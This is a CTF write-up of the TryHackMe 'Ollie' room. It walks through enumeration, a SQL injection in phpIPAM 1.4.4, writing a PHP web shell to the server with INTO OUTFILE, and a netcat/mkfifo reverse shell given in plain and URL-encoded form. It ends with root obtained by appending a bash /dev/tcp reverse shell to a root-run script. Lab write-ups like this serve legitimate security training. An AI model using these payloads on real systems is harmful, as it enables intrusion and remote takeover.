---
title: Ollie - Writeup
author: Elman Alizadeh
date: 2022-04-18 14:10:00 +0800
categories: [ctf, TryHackMe]
tags: [tryhackme, ollie]
---

Today we will take a look at TryHackMe: Ollie. My goal in sharing this writeup is to show you the way if you are in trouble. Please try to understand each step and take notes.

![Desktop View]({{ "/assets/img/thm-ollie/1.jpeg" | relative_url }})

## Network scan

Command: sudo nmap -sT -p- -T5 -vv -oN nmap/all_ports 10.10.86.146

![Desktop View]({{ "/assets/img/thm-ollie/2.png" | relative_url }})

## 1337 port Enumeration

Command: nc IP 1337

Yes, this is a simple chat correspondence. In the end, we get the necessary credential

![Desktop View]({{ "/assets/img/thm-ollie/3.png" | relative_url }})

I tried to log in to Ollie with SSH, but it didn’t work.

Let’s take a look at the website now.

![Desktop View]({{ "/assets/img/thm-ollie/4.png" | relative_url }})

It is a simple login page. Let’s enter with the credential we have.

## Sql injection

I did research on phpIPAM. And it turned out that version 1.4.4 has a vulnerability to sql injection.

Let’s check here

Go to the Routing section

![Desktop View]({{ "/assets/img/thm-ollie/5.png" | relative_url }})

Go to the example in the Peer Name section. Click the Actions button and select Subnet mapping

![Desktop View]({{ "/assets/img/thm-ollie/6.png" | relative_url }})

Now let’s check the vulnerability.

[Exploit](https://fluidattacks.com/advisories/mercury/)

Command: “union select @@version,2,user(),4 — -

![Desktop View]({{ "/assets/img/thm-ollie/7.png" | relative_url }})

It works. Now let’s create rce

[RCE](https://kayran.io/blog/web-vulnerabilities/sqli-to-rce/)

Command: “ union select null,null,null,”<?php system($_GET[‘cmd’]); ?>” into outfile “/var/www/html/backdoor.php” — -

![Desktop View]({{ "/assets/img/thm-ollie/8.png" | relative_url }})

Reverse shell weed. But keep in mind that you need to encode the url as you type in the url section.

Command: rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 4242 >/tmp/f

[Url_encode](https://www.urlencoder.org/)

```console
rm%20-f%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20IP%204242%20%3E%2Ftmp%2Ff%0A
```

As soon as I received the reverse shell, I changed the user using the previous data.

![Desktop View]({{ "/assets/img/thm-ollie/9.png" | relative_url }})

## Privilege Escalation

Command: find / -group ollie 2>/dev/null

There are some interesting results. But this was the most interesting.

![Desktop View]({{ "/assets/img/thm-ollie/10.png" | relative_url }})

After checking it, I saw that it works as root, and I used it to enter the reverse shell command.

Command: echo ‘bash -i >& /dev/tcp/IP/4444 0>&1’ >> /usr/bin/feedme

![Desktop View]({{ "/assets/img/thm-ollie/11.png" | relative_url }})

![Desktop View]({{ "/assets/img/thm-ollie/12.png" | relative_url }})

## And now we are the root

![Desktop View]({{ "/assets/img/thm-ollie/1.gif" | relative_url }})

“If you have any questions or comments, please do not hesitate to write. Have a good days”













